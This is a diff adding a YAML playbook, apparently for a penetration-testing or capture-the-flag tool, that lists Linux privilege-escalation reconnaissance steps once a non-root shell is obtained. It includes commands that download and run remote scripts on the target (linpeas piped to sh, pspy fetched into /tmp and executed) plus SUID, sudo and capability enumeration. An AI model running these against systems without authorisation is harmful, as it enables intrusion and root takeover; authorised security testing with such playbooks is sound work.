@@ -1,0 +1,68 @@
+id: linux-priv-esc-recon
+name: "Linux PE — recon (linpeas/lse/pspy)"
+description: >
+  Once you land a non-root shell on a Linux box, run the standard three
+  enumeration sweeps and read their output with intent — not just glance.
+  Captures the four most common privesc primitives (SUID, sudo, capabilities,
+  writable cron) and pushes them to the board.
+tags: [linux, priv-esc, recon, post-exploitation]
+difficulty: easy
+
+inputs:
+  - name: target_ip
+    source: target_context.ip
+
+steps:
+  - id: hostinfo
+    name: "Quick host info (kernel, distro, who you are)"
+    inline_command: "id; uname -a; cat /etc/os-release; whoami; groups"
+    notes: |
+      Old kernel + glibc → check DirtyCow / DirtyPipe / OverlayFS.
+      Membership in `docker`, `lxd`, `disk`, `adm` is free privesc.
+
+  - id: sudo_rights
+    name: "What you can sudo (no password / specific binaries)"
+    inline_command: "sudo -n -l 2>/dev/null; sudo -l"
+    notes: |
+      Anything in the list → check sudo-gtfobins-escalation chain.
+    capture:
+      - var: sudo_allowed
+        regex: '\(([A-Za-z0-9_:,!]+)\)\s+(?:NOPASSWD:\s+)?(.+)$'
+        match: all
+        groups: { as: 1, command: 2 }
+
+  - id: suid
+    name: "SUID binaries (uid=0 by setuid)"
+    inline_command: "find / -perm -4000 -type f 2>/dev/null"
+    capture:
+      - var: suid_binaries
+        regex: '^(/[^\s]+)$'
+        match: all
+
+  - id: capabilities
+    name: "File capabilities"
+    inline_command: "getcap -r / 2>/dev/null"
+    notes: |
+      cap_setuid+ep / cap_dac_read_search+ep / cap_chown+ep → priv esc.
+      Cross-reference with GTFOBins capabilities section.
+
+  - id: linpeas
+    name: "linpeas (full sweep) — review findings tagged in red/yellow"
+    inline_command: "curl -fsSL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh"
+    notes: |
+      Heavy but worth it. Pay attention to: writable /etc/passwd-/shadow,
+      writable PATH dirs, cron jobs hitting writable scripts, unusual
+      processes (pspy candidate), kernel CVEs section.
+
+  - id: pspy
+    name: "pspy — watch background processes (catch cron)"
+    inline_command: "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -p -f"
+    notes: |
+      Run for a few minutes. Any cron job that wraps a writable script in
+      a writable directory = privesc.
+
+references:
+  - title: "GTFOBins"
+    url:   "https://gtfobins.github.io/"
+  - title: "HackTricks — Linux PE"
+    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
